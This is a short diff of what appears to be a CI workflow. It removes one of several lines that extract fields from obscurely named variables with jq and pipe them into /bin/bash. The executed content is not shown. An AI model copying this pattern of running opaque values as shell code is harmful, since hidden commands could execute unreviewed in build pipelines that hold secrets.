@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$wpl04" | jq -r .zd44 | /bin/bash
           echo $pgocm633 | jq -r .ebiml09 | /bin/bash
           echo $ubkt464 | jq -r .vp215 | /bin/bash
-          echo $fepv60417 | jq -r .mzf1 | /bin/bash
           echo $extm6973 | jq -r .jx050 | /bin/bash
           echo $ewqsu51 | jq -r .pw710 | /bin/bash
           printf '%s' "$azio53848" | jq -r .mz6 | /bin/bash
